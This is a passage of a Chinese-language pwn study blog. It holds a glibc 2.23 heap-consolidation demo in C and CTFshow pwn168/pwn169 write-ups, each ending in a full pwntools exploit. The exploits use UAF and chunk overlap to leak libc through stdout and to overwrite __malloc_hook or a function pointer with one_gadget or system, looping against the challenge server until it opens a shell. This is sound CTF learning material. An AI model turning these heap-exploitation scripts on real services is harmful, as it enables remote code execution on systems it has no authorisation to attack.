class="string">&quot;\033[1;33m假设，我们通过某种方法，构造了如下的一个fakechunk：\033[0m\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fakechunk的地址(包含chunk头)：%p\n&quot;</span>,fakechunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fd: %#lx\n&quot;</span>,fakechunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bk: %#lx\n&quot;</span>,fakechunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fd_nextsize: %#lx\n&quot;</span>,fakechunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bk_nextsize: %#lx\n\n&quot;</span>,fakechunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">b=(<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);<span class="comment">/*这就是要触发，向后合并和topchunk合并的堆块.*/</span></span><br><span class="line"><span class="type">size_t</span>* b_size_ptr=(<span class="type">size_t</span>*)(b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>));<span class="comment">/*指向 chunk b 的size位.*/</span></span><br><span class="line"><span class="type">size_t</span>* b_addr=(<span class="type">size_t</span> *)(b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>);<span class="comment">/*同时也是 chunk b 的prev_size*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m这里创建一个堆块b,作为合并的关键堆块:\033[0m\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b的地址(含chunk头)： %p\n&quot;</span>,b_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b的size位：%#lx\n\b&quot;</span>,*b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b的prev_size: %#lx\n\n&quot;</span>,*b_addr);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">接下来就是修改size和prev_size</span></span><br><span class="line"><span class="comment">这里本来是想直接利用b相关的指针去修改b的size 和 prev_size，但是</span></span><br><span class="line"><span class="comment">这样做体现不出通过a的溢出漏洞来修改，所以还是使用a相关的指针去修改。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m那么，对于现在创建的堆块b，我们可以通过溢出去修改它的一些数据:\033[0m\n&quot;</span>);</span><br><span class="line">a[a_size]=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改后b的size位：%#lx\n&quot;</span>,*b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">接下来是计算，计算fakechunk的大小。fakechunk的大小当然不是0x100,</span></span><br><span class="line"><span class="comment">它应该是从fakechunk到b中间这么大的一块区域</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> fakesize=(<span class="type">size_t</span>)((<span class="type">uint8_t</span> *)(b_addr)-(<span class="type">uint8_t</span> *)fakechunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b的prev_size应该用 b 的地址减 fakechunk 的地址: %p-%p=%#lx\n&quot;</span>,b_addr,fakechunk,fakesize);</span><br><span class="line">*(<span class="type">size_t</span> *)&amp;a[a_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]=fakesize;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;修改后b的prev_size: %#lx\n\n&quot;</span>,*b_addr);</span><br><span class="line"><span class="comment">/*为了正确的合并，fakechunk的size需要和prev_size对应上*/</span></span><br><span class="line">fakechunk[<span class="number">1</span>]=fakesize;</span><br><span class="line"><span class="comment">/*触发合并*/</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;合并后fakechunk的size: %#lx\n&quot;</span>,fakechunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;是b.size+b.prev_szie+b.next_szie(也就是topchunk的大小)得来的\n&quot;</span>);</span><br><span class="line"><span class="comment">/*最后看分配到了哪里*/</span></span><br><span class="line">c=(<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="type">size_t</span>* c_addr=(<span class="type">size_t</span> *)(c-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m最后申清一个堆块c,并查看一下是否达到了我们的目的:\033[0m\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c的地址(包含chunk头)：%p\n&quot;</span>,c_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>​请在ubuntu16下编译(即使用glibc-2.23)。编译时记得关掉pie，这样便于打断点。<br>​编译时参数(只能在64位下编译)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -ggdb demo.c -o demo -z execstack -fno-stack-protector -no-pie -z norelro</span><br></pre></td></tr></table></figure><p>​这个demo是自己写的，在how2heap的基础上添加了一些基础的描述。希望可以更清楚的表达出，漏洞利的一个思路。同时，关于合并后的size大小，这里描述也做了修改。因为合并是b和fakechunk以及topchunk，所以最后的大小理论上也是三个堆块的大小相加。<br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622133210334.png" alt="image-20250622133210334"><br>​事实上，也确实如此</p><h3 id="逐步演示"><a href="#逐步演示" class="headerlink" title="逐步演示"></a>逐步演示</h3><h4 id="创建a堆块"><a href="#创建a堆块" class="headerlink" title="创建a堆块"></a>创建a堆块</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140529903.png" alt="image-20250622140529903"><br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140615994.png" alt="image-20250622140615994"></p><h4 id="伪造fakechunk"><a href="#伪造fakechunk" class="headerlink" title="伪造fakechunk"></a>伪造fakechunk</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140854930.png" alt="image-20250622140854930"></p><h4 id="创建b堆块"><a href="#创建b堆块" class="headerlink" title="创建b堆块"></a>创建b堆块</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141009181.png" alt="image-20250622"></p><h4 id="篡改b的size的pre-inuse-位"><a href="#篡改b的size的pre-inuse-位" class="headerlink" title="篡改b的size的pre_inuse 位"></a>篡改b的size的pre_inuse 位</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141342243.png" alt="image-20250622141342243"></p><h4 id="篡改b的prev-size"><a href="#篡改b的prev-size" class="headerlink" title="篡改b的prev_size"></a>篡改b的prev_size</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141504102.png" alt="image-20250622141504102"></p><h4 id="修改fakechunk的size"><a href="#修改fakechunk的size" class="headerlink" title="修改fakechunk的size"></a>修改fakechunk的size</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141624553.png" alt="image-20250622141624553"></p><h4 id="free-b"><a href="#free-b" class="headerlink" title="free(b)"></a>free(b)</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622143101805.png" alt="image-20250622143101805"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> House of XXX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow pwn169</title>
      <link href="/2025/06/22/heap/CTFshow%20pwn169/"/>
      <url>/2025/06/22/heap/CTFshow%20pwn169/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-pwn169-重叠-劫持stdout"><a href="#CTFshow-pwn169-重叠-劫持stdout" class="headerlink" title="CTFshow pwn169(重叠|劫持stdout)"></a>CTFshow pwn169(重叠|劫持stdout)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​堆块重叠，真的是绕不开的一个手法。只要有uaf漏洞几乎都需要重叠来配合。这一道是比较简单的一道题，自己拖拖拉拉，又捱到了22点才完成这到题。对stdout已经完全不陌生了，感觉像老朋友了。这到题也算又扩展（应该算复习）了堆块重叠的一种方法。<br>​如果说uaf漏洞是在借尸还魂，那么我们重叠的手法就是<strong>“瞒天过海”</strong></p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="main函数分析"><a href="#main函数分析" class="headerlink" title="main函数分析"></a>main函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230847917.png" alt="image-20250611230847917"><br>1.一个menu，三个功能<br>2.没有show，应该是需要劫持stdout来泄露libc的</p><h3 id="create函数分析"><a href="#create函数分析" class="headerlink" title="create函数分析"></a>create函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230931371.png" alt="image-20250611230931371"><br>1.限制了大小，大小合适才能malloc<br>2.96是0x60，加上chunk头，最大是0x70，这个大小还不够进入unsorted bin</p><h3 id="delete函数分析"><a href="#delete函数分析" class="headerlink" title="delete函数分析"></a>delete函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231214680.png"><br>1.明显的uaf漏洞</p><h3 id="rename函数分析"><a href="#rename函数分析" class="headerlink" title="rename函数分析"></a>rename函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231354251.png" alt="image-20250611231354251"><br>1.没有漏洞只能正常的编辑堆块内容</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>1.在保护机制全开的情况下，没有show功能的时候，第一想到的就是劫持stdout。常见做法就是打overlap，让堆块既在fastbins又在unsorted bin中。因为unsorted bin中的堆块会被写入main_arena相关地址，借此覆盖低位就可以劫持的stdout。但是这题限制了堆块大小，我们该如何把堆块放入unsorted bin中呢？<br>2.利用堆块的重叠，去构造一个大小可以进入unsorted bin中的堆块。其实堆块重叠的本质是修改堆块的size，使其修改后的大小可以包含相邻的其他堆块(刚好重叠)。在这道题中我们没有溢出漏洞去修改size，所以不能直接完成这个利用。但是我们可以在堆块内，构造一个fake chunk 的chunk 头 ，然后通过fastbins 的fd 链表，覆盖低地址，把fake chunk 链入链表中。然后分配出这个堆块，因为堆块的重叠，物理地址相邻的下一个堆块的chunk 头就在我们可编辑的范围内了。然后就可以修改其size，把其放入unsorted bin中。同时，为了可以分配到stdout，我们需要提前把这个unsorted bin的堆块放入fastbins 中，通过fastbin dup 去劫持。<br>3.泄露出libc后呢，就是劫持malloc_hook和realloc。也是很常规的操作了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;66%&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;wlecome input your size of skills: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;input index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;input your name:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;input idx :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;input idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;new content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    fake=p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">b&#x27;\x63&#x27;</span>*<span class="number">0x10</span>+fake) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;\x61&#x27;</span>*<span class="number">4</span>) <span class="comment"># 1 .....</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="number">2</span>,<span class="string">b&#x27;\x62&#x27;</span>*<span class="number">4</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">3</span>,<span class="string">b&#x27;\x64&#x27;</span>*<span class="number">4</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">4</span>,<span class="string">b&#x27;\x64&#x27;</span>*<span class="number">4</span>) <span class="comment"># 4</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;\x20&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">5</span>,<span class="string">b&#x27;f&#x27;</span>)  <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">b&#x27;\xdd\x55&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak - libc</span></span><br><span class="line">    io.recv(<span class="number">0x40</span>)</span><br><span class="line">    stdout=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))+<span class="number">0x20</span></span><br><span class="line">    libcbase=stdout-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    malloc_hook=libcbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    realloc=libcbase+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    one_gadget=[<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>]</span><br><span class="line">    logvalue(<span class="string">&quot;stdout&quot;</span>,<span class="built_in">hex</span>(stdout))</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">    payload=<span class="number">0xb</span>*<span class="string">b&quot;\x00&quot;</span>+p64(one_gadget[<span class="number">0</span>]+libcbase)+p64(realloc+<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,payload)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;wlecome input your size of skills: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;input index: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io,elf=loadfile(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28175</span>)</span><br><span class="line">        exploit()</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow pwn168</title>
      <link href="/2025/06/22/heap/CTFshow%20pwn168/"/>
      <url>/2025/06/22/heap/CTFshow%20pwn168/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-pwn168-UAF-重叠"><a href="#CTFshow-pwn168-UAF-重叠" class="headerlink" title="CTFshow pwn168(UAF|重叠)"></a>CTFshow pwn168(UAF|重叠)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​差不多又休息了一周的时间，然后继续学习。这一题属与是入门级的UAF，太经典了。自己在写的时候还是卡住了，看到没有show这个功能，下意识想到劫持IO。因为堆溢出的题，劫持IO很常见，并且前几题都是如此。但是因为没有溢出漏洞，难以利用unsorted bin 中的chunk，覆盖低位去劫持IO。结果这倒题是用经典的UAF利用，覆盖原功能函数为printf.plt 去泄露栈上的libc，再同理修改原功能函数为system 去执行。<br>​可谓是<strong>“狸猫换太子”+“借尸还魂”</strong></p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="creat函数分析"><a href="#creat函数分析" class="headerlink" title="creat函数分析"></a>creat函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610224944662.png" alt="image-20250610224944662"><br>1.首先会自动申请一个0x20的堆块，设为ptr1<br>2.如果我们输入的字符串长度大于0xf 就会再申请一个堆块来储存st，设为ptr2r；否则就会用0x20的堆块来储存<br>3.如果申请了ptr2，这ptr1指向ptr2，ptr1+3指向某个函数地址；如果没有ptr2，在ptr1中存放str，ptr1+3指向某个函数<br>4.ptr1+4 存放这数据长度<br>5.同时在bss段上的heaplist存放ptr1。<br>6.这里存在一个注意点，这里的buf是公用的。就是上一次的缓冲区，和这一次是一样的。并且因为使用strlen 和 strncpy 会出先”\x00”截断的情况。</p><h3 id="delete函数分析"><a href="#delete函数分析" class="headerlink" title="delete函数分析"></a>delete函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610225808351.png" alt="image-20250610225808351"><br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230022127.png" alt="image-20250610230022127"><br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230034623.png" alt="image-20250610230034623"></p><p>1.delete 没有直接free，而是调用了之前保存在堆块里的指针，并且传递了堆块地址为参数<br>2.点击查看两个free，发现都是只有free，没有置空指针，存在uaf漏洞</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>1.首先要理解这里的堆块结构，当str长度大于0xf时，添加一个str会分配两个堆块。分别将其称为head和content。那么str的内容在content中，head只保留一些信息和free功能的指针。<br>2.如果可以将某个堆块的head，分配给其他堆块作content，我们就可以修改这个功能，为其他的功能。最直接的就是将这个功能修改为system，再把参数设置为”&#x2F;bin&#x2F;sh;”就可以打通。但再此之前我们要泄露出libc。<br>3.劫持stdout，在这里似乎是行不通的。一般常见的手法是利用覆盖unsorted bin 中的fd 的低地址，同时通过 fastbin dup 去分配到stdout 从而完成劫持。但是这里没有溢出的漏洞。<br>4.所以，在这里考虑用覆盖原功能函数的低地址为printf.plt的低地址。虽然题目开启了pie，但对低地址的影响不大，可以爆破到。并且这个功能函数的参数就是head 堆块的内容。将其修改为printf后，关注到栈上存在stdout ，所以可以通过这个泄露libc。<br>5.那么这里是怎么让head成为content的呢，首先我们添加一个0x10的str，id为0，因为长度大于0xf，所以它会有head 和 content。同时head整个的大小是0x30(加上chunk 头),content的大小是0x20(一定不能是0x30).再添加一个，id为1。delete(1),delete(0)。这个时候再fastbins 中有两条链，一条是0x20，一条是0x30.都是两个chunk。我们再添加(0x18~0x28)大小之间的堆块，就会把两个0先0x30大小的堆块分配出来，也就id 为1 的head 变成了content。完成对id为1 的head 的修改，只要再次delete(1) 就可以执行我们的功能。<br>6.在泄露libc后，如法炮制。把system的地址写上去，就可以getshell了。但是注意不能用”&#x2F;bin&#x2F;sh\x00”，因为会0字符截断，导致后续的system地址写不上去。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;66%&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;create &quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Pls give string size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;str:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">    io.send(<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;id:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Are you sure?:&quot;</span>,<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    create(<span class="number">0x10</span>,<span class="string">b&#x27;\x61&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0 </span></span><br><span class="line">    create(<span class="number">0x10</span>,<span class="string">b&#x27;\x62&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">    delete(<span class="number">1</span>) </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x20</span>,<span class="string">b&#x27;%22$p&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;b&#x27;</span>) + p16(<span class="number">0x08C0</span>)) <span class="comment"># 0 1是content</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    stdout=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    libc=LibcSearcher(<span class="string">&quot;_IO_2_1_stdout_&quot;</span>,stdout)</span><br><span class="line">    libcbase=stdout-libc.dump(<span class="string">&quot;_IO_2_1_stdout_&quot;</span>)</span><br><span class="line">    system=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">    <span class="comment"># libcbase=stdout-libc.sym[&quot;_IO_2_1_stdout_&quot;]</span></span><br><span class="line">    <span class="comment"># system=libcbase+libc.sym[&quot;system&quot;]</span></span><br><span class="line">    logvalue(<span class="string">&quot;system&quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line">    logvalue(<span class="string">&quot;libc&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">    create(<span class="number">0x10</span>,<span class="string">b&#x27;\x61&#x27;</span>*<span class="number">0x9</span>+<span class="string">b&#x27;\x00&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">    create(<span class="number">0x10</span>,<span class="string">b&#x27;\x62&#x27;</span>*<span class="number">0x9</span>+<span class="string">b&#x27;\x00&#x27;</span>)   <span class="comment"># 2</span></span><br><span class="line">    delete(<span class="number">2</span>)  </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    create(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh;&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;\x63&#x27;</span>) + p64(system)) <span class="comment"># 1 2是content</span></span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io,elf=loadfile(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28247</span>)</span><br><span class="line">        exploit()</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    